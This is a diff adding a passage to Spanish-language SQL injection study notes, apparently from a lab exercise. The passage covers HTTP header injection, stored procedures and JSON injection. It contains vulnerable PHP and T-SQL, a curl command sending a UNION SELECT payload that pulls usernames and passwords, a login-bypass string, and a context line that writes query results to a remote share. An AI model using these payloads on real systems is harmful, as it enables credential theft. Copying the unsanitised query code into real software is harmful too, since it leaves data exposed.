@@ -294,7 +294,65 @@ SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';.
 
 # Otras técnicas
 
+### HTTP Header Injection
 
+Las cabeceras HTTP llevan el input del usuario, se usan en las consultas de lado servidor del SQL. Si estos inputs no estan sanitizados, pudiendo provocar una injección SQL. Las técnicas envuelven manipulaciones HTTP (como User-Agent, Referer o X-FOrwarded-FOR). El servidor coge estas cabeceras y las consultas SQL. Por ejemplop, una cabecera User-Agent maliciosa se ve como "User-Agent: ' OR 1=1; -- si el servidor incluye la cabecea sin sanitizar encontraremos una injección SQL
+
+Por ejemplo:
+
+```
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$insert_sql = "INSERT INTO logs (user_Agent) VALUES ('$userAgent')";
+if ($conn->query($insert_sql) === TRUE) {
+    echo "<p class='text-green-500'>New logs inserted successfully</p>";
+} else {
+    echo "<p class='text-red-500'>Error: " . $conn->error . " (Error Code: " . $conn->errno . ")</p>";
+}
+
+$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'";
+..
+...
+```
+
+### preparar el payload
+
+```
+curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://MACHINE_IP/httpagent/
+```
+
+# Explotar procesos guardados
+
+Los procesos guardados son rutinas que se guardan en la BD y pueden hacer varias operaciones, intersantes, como descargar, datos. Mientras esto se guarda te peude ayudar en el desarrollo
+
+
+```
+CREATE PROCEDURE sp_getUserData
+    @username NVARCHAR(50)
+AS
+BEGIN
+    DECLARE @sql NVARCHAR(4000)
+    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
+    EXEC(@sql)
+END
+```
+
+# XML y JSON injeccion
+
+Aplicaciones que llevan este tip ode datos pueden ser vulnerables a este tipo de injecciones con estos valores
+
+```
+{
+  "username": "admin' OR '1'='1--",
+  "password": "password"
+}
+```
+
+# Automatización
+
+- SQlMap
+- SQLNinja
+- JSQL Injection
+- BBQSQL
 
 
 
